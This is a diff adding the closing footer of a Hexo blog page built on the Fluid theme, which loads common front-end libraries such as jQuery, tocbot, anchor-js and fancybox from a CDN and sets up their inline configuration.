+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
